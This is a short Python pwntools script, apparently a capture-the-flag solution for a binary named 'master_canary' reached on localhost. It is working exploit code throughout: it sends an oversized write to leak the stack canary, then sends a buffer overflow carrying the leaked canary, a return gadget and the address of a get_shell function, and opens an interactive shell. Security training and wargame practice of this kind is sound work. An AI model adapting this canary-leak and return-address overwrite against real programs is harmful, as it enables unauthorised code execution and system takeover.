from pwn import *

p = remote('localhost', 10001)
# p = process("./master_canary")
e = ELF('./master_canary')
getshell = e.symbols['get_shell']
#getshell = 0x400a4a
ret = 0x00000000004007e1

p.sendlineafter(b"> ", "1")
p.sendlineafter(b"> ", "2")
p.sendlineafter(b"Size: ", str(0x8e9).encode())
p.sendafter(b"Data: ", b'A'*0x8e9)

p.recvuntil(b'A'*0x8e9)
canary = u64(b'\x00'+p.recvn(7))

print(hex(canary))

p.sendlineafter("> ", "3")
p.sendafter("Leave comment: ", b'A'*0x28+p64(canary)+b'B'*0x8+p64(ret)+p64(getshell))

p.interactive()